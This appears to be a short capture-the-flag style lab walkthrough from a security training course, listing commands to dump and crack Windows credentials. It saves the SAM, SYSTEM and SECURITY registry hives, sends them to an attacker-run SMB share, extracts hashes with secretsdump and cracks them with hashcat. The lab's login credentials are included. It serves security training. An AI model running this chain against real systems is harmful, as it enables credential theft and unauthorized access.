
opening a RDP sesh to the target machine
```sh
xfreerdp /v:10.129.199.107 /u:Bob /p:HTB_@cademy_stdnt!
```

use reg.exe to save the registry hives
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

create a share on our attacker machine
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1272997/
```

move the files to our attacker machine share
```
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
```

dump the hashes with secretdump
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

save the hashes to a text file
```
sudo vim hashestocrack.txt
```
run hashcat on the hashes
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```